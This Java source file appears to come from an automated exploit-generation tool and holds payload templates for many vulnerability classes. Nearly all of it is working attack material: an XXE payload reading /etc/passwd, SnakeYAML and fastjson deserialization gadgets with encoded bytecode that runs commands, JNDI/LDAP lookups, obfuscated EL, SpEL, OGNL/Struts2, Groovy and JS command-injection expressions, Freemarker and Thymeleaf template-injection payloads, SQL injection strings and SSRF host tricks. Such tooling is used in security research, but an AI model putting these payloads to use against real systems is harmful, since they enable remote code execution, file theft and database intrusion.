package exploits;

import exploits.templates.*;
import exploits.templates.base.AbstractExploitTemplate;

import java.util.HashMap;
import java.util.Map;

public class ExploitTemplatesContainer {

    // Vuln. type (see exploits.VulnType.class) -> [exploit exploits.templates]
    public static Map<String, AbstractExploitTemplate> exploitTemplates = new HashMap<>();

    public static void initExploitTemplates() {
        initSSRFTemplates();
        initCommandInjectionTemplates();
    }

    private static void initXXETemplates() {
        XXETemplate exploitTemplate = new XXETemplate();
        // exploit body
        // - template 1
        exploitTemplate.addExploitBody("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ELEMENT foo ANY >\n" +
                "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n" +
                "<foo>&xxe;</foo>");

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initDeserializationTemplates() {
        // for deserialization, we only care about the snakeYaml and fastjson for now.
        DeserializationTemplate exploitTemplate = new DeserializationTemplate();

        // exploit body (snakeYaml)
        // - template 1 - c3p0 jndi (c3p0 dependency is needed)
        exploitTemplate.addExploitBody("!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                "jndiName: rmi://127.0.0.1:8989/exp\n" +
                "loginTimeout: 0");
        // - template 2 - script engine rce
        exploitTemplate.addExploitBody("!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"/tmp/yaml-payload.txt\"],false],!!java.util.zip.Inflater  { input: !!binary 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 },1048576]]");
        exploitTemplate.addExploitBody("!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"file:///tmp/yaml-payload.txt\"]]]]");

        // exploit body (fastjson)
        // - template 1 - TemplateImpl gadget
        exploitTemplate.addExploitBody("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"}");
        // - template 2 - JdbcRowSetImpl gadget
        exploitTemplate.addExploitBody("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/#Exp\", \"autoCommit\":false}");

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initExpressionInjectionTemplates() {
        ExpressionInjectionTemplate exploitTemplate = new ExpressionInjectionTemplate();

        // exploit body (JSP EL)
        // - template 1 - command injection i
        exploitTemplate.addJspElExpBody("\"${''.getClass().forName('jav'+'a.lang.Ru'+'ntime')" +
                "getMethod('ex'+'ec',''.getClass())" +
                ".invoke(''.getClass().forName('jav'+'a.lang.R'+'untime').getMethod('getR'+'untime').invoke(null),'" +
                AbstractExploitTemplate.EXP_CONTENT_TAG_I +
                "')}\"");
        // - template 2 - command injection ii
        exploitTemplate.addJspElExpBody("${''.getClass().forName(\"jav\"+\"ax.scr\"+\"ipt.Scr\"+\"iptEng\"+\"ineManager\").newInstance()" +
                ".getEngineByName(\"Jav\"+\"aScript\").eval(\"jav\"+\"a.lan\"+\"g.Runt\"+\"ime.getR\"+\"untime().exec('" +
                AbstractExploitTemplate.EXP_CONTENT_TAG_I +
                "')\")}");


        // exploit body (SpEL)
        // - template 1 - command injection i
        exploitTemplate.addSpELExpBody("T(java.lang.Runtime).getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");
        // - template 2 - command injection ii
//        exploitTemplate.addSpELExpBody("new ProcessBuilder(new String[]{"
//                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "}).start()");
        // - template 3 - command injection iii
        exploitTemplate.addSpELExpBody("new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");


        // exploit body (JEXL)
        // - template 1 - command injection i
        exploitTemplate.addExploitBody("1.class.forName(\"java.lang.Runtime\").getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");

        // exploit body (MVEL)
        // - template 1 - command injection i
        exploitTemplate.addMvELExpBody("Runtime.getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");
        // - template 2 - command injection ii
//        exploitTemplate.addMvELExpBody("new java.lang.ProcessBuilder(new java.lang.String[]{\""
//                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\"}).start()");

        // exploit body (OGNL)
        // - template 1 - command injection i
        exploitTemplate.addOgnlExpBody("@java.lang.Runtime@getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");
        // - template 2 - command injection ii
//        exploitTemplate.addOgnlExpBody("(new java.lang.ProcessBuilder(new java.lang.String[]{\""
//                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\"})).start()");
        // for struts2...
        // - template 3 - command injection iii
        exploitTemplate.addOgnlExpBody("(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('"
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "'))");
        // - template 4 - command injection iv
//        exploitTemplate.addOgnlExpBody("(#p=new java.lang.ProcessBuilder('"
//                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "')).(#p.start())");
        // - template 5 - command injection v
        exploitTemplate.addOgnlExpBody("(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('"
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "'))");
        // - template 6 - command injection vi
        exploitTemplate.addExploitBody("(#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear())." +
                "(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))." +
                "(@java.lang.Runtime@getRuntime().exec('"
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "'))");
        // - template 7 - command injection vii
        exploitTemplate.addExploitBody("(#context=#attr['struts.valueStack'].context)." +
                "(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))." +
                "(@java.lang.Runtime@getRuntime().exec('"
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "'))");


        // exploit body (Groovy)
        // - template 1 - command injection i
        exploitTemplate.addExploitBody("@groovy.transform.ASTTest(value={ assert Runtime.getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\") })\n" +
                "class Exp{}");
        // - template 2 - malicious class loading ii (malicious class is needed)
        exploitTemplate.addExploitBody("@GrabResolver(name='exp', root='http://localhost:8989/')\n" +
                "@Grab(group='com.exp', module='com.exp', version='1.0.0')\n" +
                "import com.exp");
        // - template 3 - command injection iii
        exploitTemplate.addExploitBody("Runtime.getRuntime().exec(\"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");
        // - template 4 - command injection iv
        exploitTemplate.addExploitBody("'" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "'.execute()");
        // - template 5 - command injection v
        exploitTemplate.addExploitBody("import java.lang.reflect.Method;\n" +
                "Class<?> rt = Class.forName(\"java.la\" + \"ng.Run\" + \"time\");\n" +
                "Method gr = rt.getMethod(\"getR\" + \"untime\");\n" +
                "Method ex = rt.getMethod(\"ex\" + \"ec\", String.class);\n" +
                "ex.invoke(gr.invoke(null), \"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");

        // exploit body (JS)
        // - template 1 - command injection i
        exploitTemplate.addExploitBody("var x=new Function('return'+'(new ja'+'va.'+'lan' + 'g.Proce'+'ssBuilder)')();x.command(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\");x.start();var a = mainOutput(); function mainOutput() {};\n");


        // exploit content
        exploitTemplate.addExploitContent("touch /tmp/rce"); // for directed command injection
        exploitTemplate.addExploitContent("s=[2];s[0]='touch';s[1]='/tmp/jsrce';java.lang.Runtime.getRuntime().exec(s);"); // for js-style command injection

        // pre-escape
        exploitTemplate.addPreEscape("}");
        exploitTemplate.addPreEscape(")");
        exploitTemplate.addPreEscape(";");

        // post-escape
        exploitTemplate.addPostEscape("//");

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initTemplateInjectionTemplates() {
        TemplateInjectionTemplate exploitTemplate = new TemplateInjectionTemplate();

        // exploit body (Freemaker)
        // - template 1 - command injection i
        exploitTemplate.addFreeMakerExpBody("<#assign classLoader=object?api.class.protectionDomain.classLoader> \n" +
                "<#assign clazz=classLoader.loadClass(\"ClassExposingGSON\")> \n" +
                "<#assign field=clazz?api.getField(\"GSON\")> \n" +
                "<#assign gson=field?api.get(null)> \n" +
                "<#assign ex=gson?api.fromJson(\"{}\", classLoader.loadClass(\"freemarker.template.utility.Execute\"))> \n" +
                "${ex(\"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\"\")}");
        // - template 2 - command injection ii
        exploitTemplate.addFreeMakerExpBody("<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>" +
                "${value(\"java.lang.ProcessBuilder\",\"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\").start()}");
        // - template 3 - command injection iii
        exploitTemplate.addFreeMakerExpBody("<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()>" +
                "<@value>import os;os.system(\"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")");
        // - template 4 - command injection iv
        exploitTemplate.addFreeMakerExpBody("<#assign ex=\"freemarker.template.utility.Execute\"?new()>" +
                " ${ ex(\"" + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\") }");
        // - template 5 - file read
        exploitTemplate.addFreeMakerExpBody("<#assign is=object?api.class.getResourceAsStream(\"/etc/passwd\")>\n" +
                "FILE:[<#list 0..999999999 as _>\n" +
                "    <#assign byte=is.read()>\n" +
                "    <#if byte == -1>\n" +
                "        <#break>\n" +
                "    </#if>\n" +
                "${byte}, </#list>]");
        // - template 6 - file write
        exploitTemplate.addFreeMakerExpBody("<#assign uri=object?api.class.getResource(\"/\").toURI()>\n" +
                "<#assign input=uri?api.create(\"file:///etc/passwd\").toURL().openConnection()>\n" +
                "<#assign is=input?api.getInputStream()>\n" +
                "FILE:[<#list 0..999999999 as _>\n" +
                "    <#assign byte=is.read()>\n" +
                "    <#if byte == -1>\n" +
                "        <#break>\n" +
                "    </#if>\n" +
                "${byte}, </#list>]");

        // exploit body (Thymeleaf)
        // - template 1 - command injection i
        exploitTemplate.addThymeleafExpBody("__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\").getInputStream()).next()}__::.x");
        // - template 2 - command injection ii
        exploitTemplate.addThymeleafExpBody("__${T(java.lang.Runtime).getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")}__::x");
        // - template 3 - command injection iii
        exploitTemplate.addThymeleafExpBody(";/__${T (java.lang.Runtime).getRuntime().exec(\""
                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")}__::x");
        // - template 4 - command injection iv
//        exploitTemplate.addThymeleafExpBody("//__${T (java.lang.Runtime).getRuntime().exec(\""
//                + AbstractExploitTemplate.EXP_CONTENT_TAG_I + "\")}__::x");

        // exploit content
        exploitTemplate.addExploitContent("whoami");

        // for template injection, we do not care about the escape string.

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initSQLITemplates() {
        // for SQL Injection, we only care about the MYSQL for now.
        SQLITemplate exploitTemplate = new SQLITemplate();

        // exploit body
        // - template 1, union select
        //  - for union select, we do not care about the actual column numbers.
        exploitTemplate.addExploitBody(" union select 1,2,3");
        // - template 2, escape string 1 + (logical operator + exploit) + escape string 2.
        //  - e.g., ' or 1=1 --
        exploitTemplate.addExploitBody(AbstractExploitTemplate.EXP_CONTENT_TAG_I);
        // - template 3, stack injection
        exploitTemplate.addExploitBody(";" + AbstractExploitTemplate.EXP_CONTENT_TAG_I);

        // exploit content
        exploitTemplate.addExploitContent(" or 1=1");
        exploitTemplate.addExploitContent(" || 1=1");
        exploitTemplate.addExploitContent(" and updatexml(1,concat(0x7e,(select 1),0x7e),1)");
        exploitTemplate.addExploitContent(" and extractvalue(1,concat(0x7e,(select 1),0x7e))");

        // pre-escape
        // - for SQLI, we only care about the single quota, double quota, and back quota.
        // - they have been pre-defined in `AbstractExploitTemplate`.

        // post-escape
        exploitTemplate.addPostEscape("#");
        exploitTemplate.addPostEscape("-- ");

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initSSRFTemplates() {
        LinkInjectionTemplate exploitTemplate = new LinkInjectionTemplate();

        // schema supported by Java
        exploitTemplate.addSchema("http");
        exploitTemplate.addSchema("https");
        exploitTemplate.addSchema("file");
        exploitTemplate.addSchema("jndi");
        exploitTemplate.addSchema("ldap");
        exploitTemplate.addSchema("rmi");

        // host
        exploitTemplate.addHost("127.0.0.1");
        exploitTemplate.addHost("localhost");
        exploitTemplate.addHost("0x7f000001");
        exploitTemplate.addHost("0177.0.0.1");

        // the most common schema in Java SSRF scenario is http, https, and file.
        // exploitTemplate.addSchema("ftp");
        // exploitTemplate.addSchema("jar");
        // exploitTemplate.addSchema("mailto");
        // exploitTemplate.addSchema("netdoc");

        // exploit body
        // - template 1: schema://host:port
        // JAEX only cares about the sink with full control for now.
        exploitTemplate.addExploitBody(
                AbstractExploitTemplate.EXP_CONTENT_TAG_I + "://" +
                        AbstractExploitTemplate.EXP_CONTENT_TAG_II + ":" +
                        AbstractExploitTemplate.EXP_CONTENT_TAG_III +
                        AbstractExploitTemplate.EXP_CONTENT_TAG_IV
        );

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

    private static void initCommandInjectionTemplates() {

        CommandInjectionTemplate exploitTemplate = new CommandInjectionTemplate();

        // exploit content
        exploitTemplate.addExploitContent("whoami");
        exploitTemplate.addExploitContent("id");

        // exploit body
        // - template 1
        exploitTemplate.addExploitBody(AbstractExploitTemplate.EXP_CONTENT_TAG_I);

        // pre-escape
        exploitTemplate.addPreEscape("||");
        exploitTemplate.addPreEscape(";");
        exploitTemplate.addPreEscape("&&");

        // post-escape
        exploitTemplate.addPostEscape("||");
        exploitTemplate.addPreEscape(";");

        exploitTemplates.put(exploitTemplate.getVulnType(), exploitTemplate);
    }

}
